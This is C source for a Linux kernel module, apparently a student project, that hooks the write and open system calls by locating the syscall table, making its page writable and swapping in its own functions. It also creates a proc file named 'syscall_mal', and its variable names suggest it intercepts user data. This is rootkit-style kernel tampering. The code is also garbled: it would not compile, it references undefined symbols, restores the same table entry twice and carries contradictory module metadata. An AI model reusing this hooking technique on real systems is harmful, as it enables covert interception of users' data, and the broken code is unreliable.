/*
** syscall.c for lkm_syscall
**
** Originally made by xsyann
** Contact <contact@xsyann.com>
**
** Current version built by Andrew Cantor & Quinton Hiler
*/

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/proc_fs.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Andrew Cantor & Quinton Hiler");
MODULE_DESCRIPTION("Loadable Kernel Module Syscall");
MODULE_VERSION("0.1");

#define SYS_CALL_TABLE "sys_call_table"
#define SYSCALL_NI __NR_write
#define SYSCALL_NA __NR_open

static ulong *syscall_table = NULL;
static void *original_syscall = NULL;

asmlinkage int (*old_write)(int fildes, const void *buf, size_t nbytes);

char *buff;
int buff_length;
//Proc File variables
const char procFile[] = "syscall_mal";
char input[100]; // Gives

static int proc_show(struct seq_file *m, void *v) {
  seq_printf(m, input);
  return 0;
}

static int proc_open(struct inode *inode, struct  file *file) {
  return single_open(file, proc_show, NULL);
}

static const struct file_operations proc_input = {
  .owner = THIS_MODULE,
  .open = proc_open,
  .read = seq_read,
  .llseek = seq_lseek,
  .release = single_release,
};



static unsigned long new_write(int fildes, const void *buf, size_t nbytes)
{

	static char buffer[nbytes];
 	static int steal_dest = fildes;

        if (copy_from_user(buffer, buf, nbytes)) {
                return -EFAULT;
        }
        buffer[nbytes-1] = 0;

        return (*old_write)(int fildes, const void *buf, size_t nbytes);
}

static unsigned long new_open(const char *filename, int flags, int mode)
{

	static char buffer[100];
	static int steal_falgs = flags;
	static int detect_mode = mode;

        if (copy_from_user(buffer, buf, 100)) {
                return -EFAULT;
        }
        buffer[99] = 0;

        return (*old_open)(const char *filename, int flags, int mode);
}

static int is_syscall_table(ulong *p)
{
        return ((p != NULL) && (p[__NR_close] == (ulong)ksys_close));
}

static int page_read_write(ulong address)
{
        uint level;
        pte_t *pte = lookup_address(address, &level);

        if(pte->pte &~ _PAGE_RW)
                pte->pte |= _PAGE_RW;
        return 0;
}

static int page_read_only(ulong address)
{
        uint level;
        pte_t *pte = lookup_address(address, &level);
        pte->pte = pte->pte &~ _PAGE_RW;
        return 0;
}

static void replace_syscall(ulong offset, ulong func_address)
{

        syscall_table = (ulong *)kallsyms_lookup_name(SYS_CALL_TABLE);
        if (is_syscall_table(syscall_table)) {

                page_read_write((ulong)syscall_table);

                original_syscall = (void *)(syscall_table[offset]);

                syscall_table[offset] = func_address;

                page_read_only((ulong)syscall_table);
        }
}

static int init_syscall(void)
{
        proc_create(procFile, 0, NULL, proc);
        replace_syscall(SYSCALL_NI, (ulong)new_write);
	replace_syscall(SYSCALL_NA, (ulong)new_open);
        return 0;
}

static void cleanup_syscall(void)
{
        remove_proc_entry(procFile,NULL);
        page_read_write((ulong)syscall_table);
        syscall_table[SYSCALL_NI] = (ulong)original_syscall;
	syscall_table[SYSCALL_NI] = (ulong)original_syscall;
        page_read_only((ulong)syscall_table);
}

module_init(init_syscall);
module_exit(cleanup_syscall);


MODULE_LICENSE("GPL v2");
MODULE_DESCRIPTION("A kernel module to list process by their names");
